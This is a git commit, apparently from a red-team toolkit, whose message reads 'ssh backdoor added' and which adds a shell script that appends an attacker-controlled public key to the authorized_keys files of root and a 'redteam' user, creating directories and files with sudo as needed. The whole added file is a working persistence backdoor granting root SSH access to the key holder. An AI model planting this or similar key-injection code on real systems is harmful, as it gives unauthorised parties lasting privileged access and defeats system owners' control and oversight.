bc58a2b91b0f2ddce83ce0eae22ab2ed328b03f7
Jack Dunfey <jackdunf@Erebus-2>
2025-03-16 04:21:05 -0400

    ssh backdoor added

---
+++ insecurity/ssh_keys.sh
@@ -0,0 +1,26 @@
+USERS=(root redteam)
+
+for user in "${USERS[@]}"; do
+    home_dir="$(getent passwd $user | awk -F: '{print $6}')"
+    if [[ -z $home_dir ]]; then
+        continue
+    fi
+    sshdir="$home_dir/.ssh"
+    auth_keys="$sshdir/authorized_keys"
+
+    if [[ -f $auth_keys ]]; then
+        grep -q "AAAAC3NzaC1lZDI1NTE5AAAAIAbsgQ9t5uKNgyDtQ7IEeJcIkQ6ShMWmjXLev0R+KRID" $auth_keys && continue
+    fi
+
+    if [[ ! -d $sshdir ]]; then
+        sudo mkdir -p $sshdir
+        sudo chown $user:$(id -gn $user) $sshdir
+    fi
+
+    if [[ ! -f $auth_keys ]]; then
+        sudo touch $auth_keys
+        sudo chown $user:$(id -gn $user) $auth_keys
+    fi
+
+    sudo cat ssh_keys/erebus.pub | sudo tee -a $auth_keys
+done
